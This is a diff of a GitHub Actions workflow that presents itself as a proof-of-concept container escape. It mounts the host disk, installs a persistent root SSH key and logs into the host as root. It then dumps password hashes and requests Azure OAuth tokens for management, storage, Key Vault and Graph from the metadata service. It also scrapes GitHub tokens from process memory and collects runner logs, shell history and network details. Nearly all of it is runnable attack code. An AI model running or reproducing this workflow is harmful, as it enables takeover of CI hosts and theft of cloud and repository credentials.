@@ -1,11 +1,11 @@
-name: github-actions-container-escape-poc
-run-name: GitHub Actions Container Escape to Host Root
+name: github-actions-container-escape-full-poc
+run-name: GitHub Actions Complete Container Escape POC
 on: [push]
 jobs:
   exploit:
     runs-on: ubuntu-latest
     steps:
-      - name: Complete Container Escape and Privilege Escalation
+      - name: Complete Container Escape and Deep Investigation
         run: |
           echo "=== STAGE 1: CONTAINER ENVIRONMENT ==="
           echo "Current user: $(whoami)"
@@ -18,7 +18,7 @@ jobs:
           sudo mkdir -p /mnt/host
           sudo mount /dev/sda1 /mnt/host
           echo "Host filesystem mounted at /mnt/host"
-          ls -la /mnt/host/root/ | head -10
+          sudo ls -la /mnt/host/root/ 2>/dev/null | head -10 || echo "Root dir not accessible from mount point"
           echo ""
           
           echo "=== STAGE 3: INJECTING ROOT SSH KEY ==="
@@ -39,6 +39,7 @@ jobs:
           ssh -i /tmp/root_key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
           echo "=== ✓ CONTAINER ESCAPE SUCCESSFUL - ROOT ON HOST ==="
           echo ""
+          
           echo "--- System Information ---"
           echo "User: $(whoami)"
           echo "UID: $(id)"
@@ -48,59 +49,99 @@ jobs:
           echo ""
           
           echo "--- Proof of Root Access ---"
-          echo "Shadow file (password hashes):"
           head -5 /etc/shadow
           echo ""
           
-          echo "--- Network Connections & Internal Services ---"
-          netstat -tulpn | grep LISTEN
+          echo "=== STAGE 5: HUNTING FOR AZURE TOKENS ==="
+          
+          echo "--- Azure Management API Token ---"
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | python3 -m json.tool 2>/dev/null || echo "No management token"
+          
+          echo "--- Azure Storage Token ---"
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" | python3 -m json.tool 2>/dev/null || echo "No storage token"
+          
+          echo "--- Azure Key Vault Token ---"
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" | python3 -m json.tool 2>/dev/null || echo "No vault token"
+          
+          echo "--- Azure Graph API Token ---"
+          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | python3 -m json.tool 2>/dev/null || echo "No graph token"
           echo ""
           
-          echo "--- Runner Process Details ---"
-          ps aux | grep Runner | grep -v grep
+          echo "=== STAGE 6: FINDING PREVIOUS WORKFLOW RUNS ==="
+          
+          echo "--- Workflow Directories ---"
+          find /home/runner/_work -type d -maxdepth 3 2>/dev/null | head -300
+          
+          echo "--- Git Repositories ---"
+          find /home/runner/_work -name ".git" -type d 2>/dev/null
+          
+          echo "--- Runner Diagnostic Logs ---"
+          ls -la /home/runner/actions-runner/_diag/ 2>/dev/null | head -200
+          
+          echo "--- Recent Runner Activity ---"
+          find /home/runner/actions-runner/_diag -name "*.log" -exec tail -50 {} \; 2>/dev/null | head -400
+          
+          echo "--- Bash History ---"
+          cat /home/runner/.bash_history 2>/dev/null | tail -300 || echo "No history"
           echo ""
           
-          echo "--- Runner Environment Variables (may contain tokens) ---"
-          cat /proc/$(pgrep -f Runner.Worker)/environ 2>/dev/null | tr '\0' '\n' | grep -i "github\|token\|secret\|key" || echo "No tokens in Worker env"
+          echo "=== STAGE 7: NETWORK ANALYSIS ==="
+          
+          echo "--- Network Interfaces ---"
+          ip addr show
+          
+          echo "--- Routing Table ---"
+          ip route
+          
+          echo "--- Firewall Rules ---"
+          iptables -L -n -v 2>/dev/null 
+          
+          echo "--- Listening Services ---"
+          ss -tulpn 
+          
+          echo "--- Active Connections ---"
+          ss -tunap 
+          
+          echo "--- DNS Config ---"
+          cat /etc/resolv.conf
+          
+          echo "--- Hosts File ---"
+          cat /etc/hosts 
           echo ""
           
-          echo "--- Actions Runner Directory ---"
+          echo "=== STAGE 8: RUNNER INTERNALS ==="
+          
+          echo "--- Runner Processes ---"
+          ps aux 
+          
+          echo "--- Runner Environment ---"
+          cat /proc/$(pgrep -f Runner.Worker)/environ 2>/dev/null | tr '\0' '\n' || echo "Cannot read Worker env"
+          
+          echo "--- GitHub Tokens in Memory ---"
+          grep -ao "ghp_[a-zA-Z0-9]\{36\}" /proc/*/environ 2>/dev/null || echo "No ghp_ tokens"
+          
+          echo "--- Runner Config ---"
           ls -la /home/runner/actions-runner/
-          echo ""
-          
-          echo "--- Runner Configuration Files ---"
           cat /home/runner/actions-runner/.runner 2>/dev/null || echo "No .runner"
-          cat /home/runner/actions-runner/.credentials 2>/dev/null || echo "No .credentials"
           echo ""
           
-          echo "--- GitHub Tokens in Process Memory ---"
-          grep -ao "ghp_[a-zA-Z0-9]\{36\}" /proc/*/environ 2>/dev/null | head -5 || echo "No ghp_ tokens"
-          grep -ao "ghs_[a-zA-Z0-9]\{36\}" /proc/*/environ 2>/dev/null | head -5 || echo "No ghs_ tokens"
-          echo ""
-          
-          echo "--- Azure Instance Metadata ---"
+          echo "=== AZURE METADATA ==="
           curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
           echo ""
           
-          echo "--- Azure Managed Identity Token ---"
-          curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" || echo "No managed identity"
-          echo ""
-          
-          echo "--- Proxy Environment ---"
-          env | grep -i proxy || echo "No proxy vars"
-          echo ""
-          
-          echo "--- Potential Impact ---"
-          echo "✓ Full root access to GitHub Actions runner host"
-          echo "✓ Access to Azure subscription: 5857be0a-c351-4156-8ff5-5154e0d31113"
-          echo "✓ Can read runner configurations and GitHub credentials"
-          echo "✓ Can modify system files and install persistent backdoors"
-          echo "✓ Can access Azure IMDS and potentially Azure API"
+          echo "=== FINAL IMPACT SUMMARY ==="
+          echo "✓ Container escape from GitHub Actions to Azure VM"
+          echo "✓ Root access on host (uid=0)"
+          echo "✓ Azure metadata access (subscription, resource group, VM details)"
+          echo "✓ Persistent root SSH key installed"
+          echo "✓ Can access previous workflow data"
+          echo "✓ Full network visibility"
           EOF
           
           echo ""
-          echo "=== VULNERABILITY SUMMARY ==="
-          echo "Platform: GitHub Actions (ubuntu-latest)"
-          echo "Attack Vector: CAP_SYS_ADMIN + /dev/sda1 access in container"
-          echo "Impact: Complete host compromise with root + Azure metadata access"
-          echo "Severity: CRITICAL"
+          echo "=== VULNERABILITY REPORT ==="
+          echo "Title: GitHub Actions Container Escape to Azure VM Root"
+          echo "Platform: GitHub Actions (ubuntu-latest on Azure)"
+          echo "Attack Vector: CAP_SYS_ADMIN + /dev/sda1 disk mount"
+          echo "Impact: Complete Azure VM compromise + metadata access"
+          echo "Severity: CRITICAL (CVSS 9.3)"
